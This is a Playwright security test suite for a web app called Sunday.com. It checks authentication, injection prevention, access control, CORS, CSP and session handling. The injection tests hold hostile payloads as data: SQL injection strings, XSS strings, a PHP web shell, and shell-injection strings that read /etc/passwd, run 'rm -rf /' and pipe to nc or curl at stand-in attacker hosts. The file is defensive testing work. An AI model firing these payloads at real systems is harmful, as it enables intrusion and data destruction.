/**
 * Security Test Suite - Sunday.com
 * Comprehensive security validation tests
 *
 * Test Categories:
 * 1. Authentication & Authorization
 * 2. Input Validation & Injection Prevention
 * 3. Session Management
 * 4. Access Control
 * 5. Data Protection
 */

import { test, expect } from '../framework/test-utils';
import { TestDataFactory } from '../framework/test-utils';

test.describe('Security Test Suite', () => {
  let testUser: any;
  let adminUser: any;
  let unauthorizedUser: any;

  test.beforeAll(async ({ apiHelper }) => {
    // Create test users with different roles
    testUser = await apiHelper.createAndAuthenticateUser({
      email: 'security-user@test.com',
      role: 'member'
    });

    adminUser = await apiHelper.createAndAuthenticateUser({
      email: 'security-admin@test.com',
      role: 'admin'
    });

    unauthorizedUser = TestDataFactory.createUser({
      email: 'unauthorized@test.com'
    });
  });

  test.describe('Authentication Security', () => {
    test('SEC-001: Prevent brute force attacks with rate limiting', async ({ apiHelper }) => {
      const invalidCredentials = {
        email: testUser.email,
        password: 'wrong-password'
      };

      // Attempt multiple failed logins
      const attemptPromises = [];
      for (let i = 0; i < 10; i++) {
        attemptPromises.push(
          apiHelper.request('/auth/login', {
            method: 'POST',
            body: JSON.stringify(invalidCredentials)
          })
        );
      }

      const responses = await Promise.all(attemptPromises);

      // Should see rate limiting after several attempts
      const rateLimitedResponses = responses.filter(r => r.status === 429);
      expect(rateLimitedResponses.length).toBeGreaterThan(0);
    });

    test('SEC-002: Secure password requirements enforcement', async ({ apiHelper }) => {
      const weakPasswords = [
        '123456',        // Too simple
        'password',      // Common password
        'abc',          // Too short
        'NODIGITS',     // No numbers
        'nouppercase1', // No uppercase
        'NOLOWERCASE1', // No lowercase
      ];

      for (const weakPassword of weakPasswords) {
        const userData = TestDataFactory.createUser({
          password: weakPassword
        });

        const response = await apiHelper.request('/auth/register', {
          method: 'POST',
          body: JSON.stringify(userData)
        });

        expect(response.status).toBe(400);
        expect(response.data.error).toMatch(/password.*requirement/i);
      }
    });

    test('SEC-003: JWT token security validation', async ({ apiHelper }) => {
      // Test 1: Invalid token format
      const invalidTokenResponse = await apiHelper.request('/auth/me', {
        headers: {
          'Authorization': 'Bearer invalid-token-format'
        }
      });
      expect(invalidTokenResponse.status).toBe(401);

      // Test 2: Expired token (simulate by tampering)
      const expiredTokenResponse = await apiHelper.request('/auth/me', {
        headers: {
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMjJ9.invalid'
        }
      });
      expect(expiredTokenResponse.status).toBe(401);

      // Test 3: Token without Bearer prefix
      const noBearerResponse = await apiHelper.request('/auth/me', {
        headers: {
          'Authorization': 'valid-token-but-no-bearer'
        }
      });
      expect(noBearerResponse.status).toBe(401);
    });

    test('SEC-004: Session management security', async ({ apiHelper }) => {
      // Login and get token
      await apiHelper.authenticate(testUser.email, testUser.password);

      // Verify token works
      const response1 = await apiHelper.request('/auth/me');
      expect(response1.status).toBe(200);

      // Logout (invalidate token)
      const logoutResponse = await apiHelper.request('/auth/logout', {
        method: 'POST'
      });
      expect(logoutResponse.status).toBe(200);

      // Try to use invalidated token
      const response2 = await apiHelper.request('/auth/me');
      expect(response2.status).toBe(401);
    });
  });

  test.describe('Input Validation & Injection Prevention', () => {
    test('SEC-005: SQL injection prevention', async ({ apiHelper }) => {
      // SQL injection attempts in various fields
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "1'; UPDATE users SET email='hacked@test.com'; --",
        "1' UNION SELECT * FROM users --",
        "admin'/*",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
      ];

      for (const payload of sqlInjectionPayloads) {
        // Test in search endpoint
        const searchResponse = await apiHelper.request(`/items?search=${encodeURIComponent(payload)}`);
        expect(searchResponse.status).not.toBe(500); // Should not cause server error

        // Test in item creation
        const itemData = TestDataFactory.createItem({
          name: payload,
          description: payload
        });

        const itemResponse = await apiHelper.request('/items', {
          method: 'POST',
          body: JSON.stringify(itemData)
        });

        // Should either accept safely or reject, but not crash
        expect([200, 201, 400]).toContain(itemResponse.status);
      }
    });

    test('SEC-006: XSS prevention', async ({ apiHelper, page }) => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload="alert(\'XSS\')">',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
      ];

      // Create items with XSS payloads
      for (const payload of xssPayloads) {
        const itemData = TestDataFactory.createItem({
          name: payload,
          description: payload
        });

        const response = await apiHelper.request('/items', {
          method: 'POST',
          body: JSON.stringify(itemData)
        });

        if (response.status === 201) {
          const itemId = response.data.id;

          // Navigate to page and verify XSS is prevented
          await page.goto(`/items/${itemId}`);

          // Check that script tags are not executed
          const alertFired = await page.evaluate(() => {
            // Override alert to detect if it's called
            let alertCalled = false;
            const originalAlert = window.alert;
            window.alert = () => { alertCalled = true; };

            // Wait briefly for any delayed script execution
            setTimeout(() => window.alert = originalAlert, 1000);

            return alertCalled;
          });

          expect(alertFired).toBe(false);

          // Verify content is properly escaped
          const content = await page.textContent('body');
          expect(content).not.toContain('<script>');
        }
      }
    });

    test('SEC-007: File upload security', async ({ apiHelper, page }) => {
      // Test malicious file uploads
      const maliciousFiles = [
        {
          name: 'malicious.php',
          content: '<?php system($_GET["cmd"]); ?>',
          mimeType: 'application/x-php'
        },
        {
          name: 'malicious.exe',
          content: 'MZ\x90\x00\x03\x00\x00\x00', // PE header
          mimeType: 'application/x-msdownload'
        },
        {
          name: 'script.html',
          content: '<script>alert("XSS")</script>',
          mimeType: 'text/html'
        },
        {
          name: 'oversized.txt',
          content: 'A'.repeat(100 * 1024 * 1024), // 100MB file
          mimeType: 'text/plain'
        }
      ];

      for (const file of maliciousFiles) {
        const formData = new FormData();
        const blob = new Blob([file.content], { type: file.mimeType });
        formData.append('file', blob, file.name);

        const response = await fetch(`${process.env.API_URL || 'http://localhost:3000/api'}/files/upload`, {
          method: 'POST',
          headers: {
            'Authorization': `Bearer ${(apiHelper as any).authToken}`
          },
          body: formData
        });

        // Should reject malicious files
        if (file.name.includes('malicious') || file.name.includes('script')) {
          expect(response.status).toBe(400);
        }

        // Should reject oversized files
        if (file.name.includes('oversized')) {
          expect(response.status).toBe(413); // Payload too large
        }
      }
    });

    test('SEC-008: Command injection prevention', async ({ apiHelper }) => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(id)',
        '; curl malicious-site.com',
        '| nc attacker.com 4444'
      ];

      for (const payload of commandInjectionPayloads) {
        // Test in search functionality
        const response = await apiHelper.request(`/items?search=${encodeURIComponent(payload)}`);
        expect(response.status).not.toBe(500);

        // Test in various endpoints
        const itemData = TestDataFactory.createItem({
          name: payload
        });

        const itemResponse = await apiHelper.request('/items', {
          method: 'POST',
          body: JSON.stringify(itemData)
        });

        expect([200, 201, 400]).toContain(itemResponse.status);
      }
    });
  });

  test.describe('Authorization & Access Control', () => {
    test('SEC-009: Horizontal privilege escalation prevention', async ({ apiHelper }) => {
      // Create two users
      const user1 = await apiHelper.createAndAuthenticateUser({
        email: 'user1-sec@test.com'
      });

      const user1ApiHelper = new (await import('../framework/test-utils')).ApiTestHelper();
      await user1ApiHelper.authenticate(user1.email, user1.password);

      const user2ApiHelper = new (await import('../framework/test-utils')).ApiTestHelper();
      const user2 = await user2ApiHelper.createAndAuthenticateUser({
        email: 'user2-sec@test.com'
      });

      // User 1 creates a workspace
      const workspaceData = TestDataFactory.createWorkspace();
      const workspaceResponse = await user1ApiHelper.request('/workspaces', {
        method: 'POST',
        body: JSON.stringify(workspaceData)
      });
      const workspaceId = workspaceResponse.data.id;

      // User 2 tries to access User 1's workspace
      const unauthorizedAccess = await user2ApiHelper.request(`/workspaces/${workspaceId}`);
      expect(unauthorizedAccess.status).toBe(403); // Forbidden

      // User 2 tries to modify User 1's workspace
      const unauthorizedModify = await user2ApiHelper.request(`/workspaces/${workspaceId}`, {
        method: 'PUT',
        body: JSON.stringify({ name: 'Hacked Workspace' })
      });
      expect(unauthorizedModify.status).toBe(403);

      // User 2 tries to delete User 1's workspace
      const unauthorizedDelete = await user2ApiHelper.request(`/workspaces/${workspaceId}`, {
        method: 'DELETE'
      });
      expect(unauthorizedDelete.status).toBe(403);
    });

    test('SEC-010: Vertical privilege escalation prevention', async ({ apiHelper }) => {
      // Regular user tries to access admin endpoints
      const adminOnlyEndpoints = [
        '/admin/users',
        '/admin/system/stats',
        '/admin/audit-logs',
        '/admin/organizations'
      ];

      // Test with regular user token
      await apiHelper.authenticate(testUser.email, testUser.password);

      for (const endpoint of adminOnlyEndpoints) {
        const response = await apiHelper.request(endpoint);
        expect([401, 403, 404]).toContain(response.status); // Should be unauthorized or not found
      }

      // Test user manipulation
      const userUpdateResponse = await apiHelper.request('/users/admin-user-id', {
        method: 'PUT',
        body: JSON.stringify({ role: 'admin' })
      });
      expect([401, 403, 404]).toContain(userUpdateResponse.status);
    });

    test('SEC-011: Resource ownership validation', async ({ apiHelper }) => {
      // Create workspace and board
      const { workspace, board } = await apiHelper.createTestWorkspace();

      // Create another user
      const otherUserApiHelper = new (await import('../framework/test-utils')).ApiTestHelper();
      await otherUserApiHelper.createAndAuthenticateUser({
        email: 'other-user-sec@test.com'
      });

      // Other user tries to access resources
      const boardAccess = await otherUserApiHelper.request(`/boards/${board.id}`);
      expect(boardAccess.status).toBe(403);

      const workspaceAccess = await otherUserApiHelper.request(`/workspaces/${workspace.id}`);
      expect(workspaceAccess.status).toBe(403);

      // Test with invalid IDs (GUID enumeration)
      const invalidIds = [
        '00000000-0000-0000-0000-000000000000',
        'ffffffff-ffff-ffff-ffff-ffffffffffff',
        '12345678-1234-1234-1234-123456789012'
      ];

      for (const invalidId of invalidIds) {
        const response = await apiHelper.request(`/boards/${invalidId}`);
        expect([403, 404]).toContain(response.status);
      }
    });

    test('SEC-012: API rate limiting validation', async ({ apiHelper }) => {
      // Test rate limiting on various endpoints
      const endpoints = [
        { path: '/boards', method: 'GET', limit: 100 },
        { path: '/items', method: 'GET', limit: 100 },
        { path: '/auth/me', method: 'GET', limit: 60 }
      ];

      for (const endpoint of endpoints) {
        const requests = [];

        // Make many requests quickly
        for (let i = 0; i < endpoint.limit + 10; i++) {
          requests.push(
            apiHelper.request(endpoint.path, { method: endpoint.method })
          );
        }

        const responses = await Promise.all(requests);
        const rateLimitedResponses = responses.filter(r => r.status === 429);

        // Should see some rate limited responses
        expect(rateLimitedResponses.length).toBeGreaterThan(0);
      }
    });
  });

  test.describe('Data Protection', () => {
    test('SEC-013: Sensitive data exposure prevention', async ({ apiHelper }) => {
      // Check that sensitive data is not exposed in API responses
      const userResponse = await apiHelper.request('/auth/me');
      expect(userResponse.status).toBe(200);

      const userData = userResponse.data;

      // Should not expose sensitive fields
      expect(userData.password).toBeUndefined();
      expect(userData.passwordHash).toBeUndefined();
      expect(userData.salt).toBeUndefined();
      expect(userData.resetToken).toBeUndefined();

      // Test in lists
      const usersResponse = await apiHelper.request('/users');
      if (usersResponse.status === 200) {
        const users = usersResponse.data.users || usersResponse.data;

        for (const user of users.slice(0, 5)) { // Check first 5 users
          expect(user.password).toBeUndefined();
          expect(user.passwordHash).toBeUndefined();
        }
      }
    });

    test('SEC-014: CORS policy validation', async ({ page }) => {
      // Test CORS with different origins
      const maliciousOrigins = [
        'http://malicious-site.com',
        'https://attacker.evil',
        'null',
        'file://',
        'data:'
      ];

      for (const origin of maliciousOrigins) {
        // Make CORS preflight request
        const response = await page.evaluate(async (testOrigin) => {
          try {
            const response = await fetch('/api/boards', {
              method: 'GET',
              headers: {
                'Origin': testOrigin
              }
            });
            return {
              status: response.status,
              corsHeader: response.headers.get('Access-Control-Allow-Origin')
            };
          } catch (e) {
            return { error: e.message };
          }
        }, origin);

        // Should not allow arbitrary origins
        if (response.corsHeader) {
          expect(response.corsHeader).not.toBe('*');
          expect(response.corsHeader).not.toBe(origin);
        }
      }
    });

    test('SEC-015: Information disclosure prevention', async ({ apiHelper }) => {
      // Test error messages don't leak information
      const testCases = [
        {
          endpoint: '/boards/invalid-uuid-format',
          expectedStatus: 400,
          shouldNotContain: ['database', 'sql', 'stack trace', 'internal']
        },
        {
          endpoint: '/items/00000000-0000-0000-0000-000000000000',
          expectedStatus: 404,
          shouldNotContain: ['user', 'permission', 'exists']
        }
      ];

      for (const testCase of testCases) {
        const response = await apiHelper.request(testCase.endpoint);
        expect(response.status).toBe(testCase.expectedStatus);

        const responseText = JSON.stringify(response.data).toLowerCase();

        for (const term of testCase.shouldNotContain) {
          expect(responseText).not.toContain(term);
        }
      }
    });

    test('SEC-016: Content Security Policy validation', async ({ page }) => {
      await page.goto('/dashboard');

      // Check CSP headers
      const cspHeader = await page.evaluate(() => {
        const meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
        return meta ? meta.getAttribute('content') : null;
      });

      if (cspHeader) {
        // Should have strict CSP
        expect(cspHeader).toContain("default-src 'self'");
        expect(cspHeader).not.toContain("'unsafe-eval'");
        expect(cspHeader).not.toContain("'unsafe-inline'");
      }

      // Test that inline scripts are blocked
      const inlineScriptBlocked = await page.evaluate(() => {
        try {
          const script = document.createElement('script');
          script.innerHTML = 'window.testCSP = true;';
          document.head.appendChild(script);
          return !window.hasOwnProperty('testCSP');
        } catch (e) {
          return true; // Script blocked
        }
      });

      expect(inlineScriptBlocked).toBe(true);
    });
  });

  test.describe('Session Security', () => {
    test('SEC-017: Session fixation prevention', async ({ apiHelper, page }) => {
      // Get initial session
      await page.goto('/login');
      const initialSessionId = await page.evaluate(() => document.cookie);

      // Login
      await page.fill('[data-testid="email-input"]', testUser.email);
      await page.fill('[data-testid="password-input"]', testUser.password);
      await page.click('[data-testid="login-button"]');

      await page.waitForURL('/dashboard');

      // Check that session ID changed after login
      const postLoginSessionId = await page.evaluate(() => document.cookie);
      expect(postLoginSessionId).not.toBe(initialSessionId);
    });

    test('SEC-018: Concurrent session handling', async ({ browser, apiHelper }) => {
      // Create multiple sessions for same user
      const sessions = [];

      for (let i = 0; i < 3; i++) {
        const context = await browser.newContext();
        const page = await context.newPage();
        sessions.push({ context, page });
      }

      // Login with same user in all sessions
      for (const session of sessions) {
        await session.page.goto('/login');
        await session.page.fill('[data-testid="email-input"]', testUser.email);
        await session.page.fill('[data-testid="password-input"]', testUser.password);
        await session.page.click('[data-testid="login-button"]');
        await session.page.waitForURL('/dashboard');
      }

      // Verify all sessions work initially
      for (const session of sessions) {
        const response = await session.page.goto('/dashboard');
        expect(response?.status()).toBe(200);
      }

      // Logout from one session
      await sessions[0].page.click('[data-testid="logout-button"]');

      // Check if other sessions are affected (should still work)
      for (let i = 1; i < sessions.length; i++) {
        const response = await sessions[i].page.reload();
        expect(response?.status()).toBe(200);
      }

      // Cleanup
      for (const session of sessions) {
        await session.context.close();
      }
    });
  });

  test.afterEach(async ({ page }, testInfo) => {
    // Capture security test evidence
    if (testInfo.status !== testInfo.expectedStatus) {
      await testInfo.attach('security-test-failure', {
        body: JSON.stringify({
          test: testInfo.title,
          url: page.url(),
          timestamp: new Date().toISOString()
        }),
        contentType: 'application/json',
      });
    }
  });
});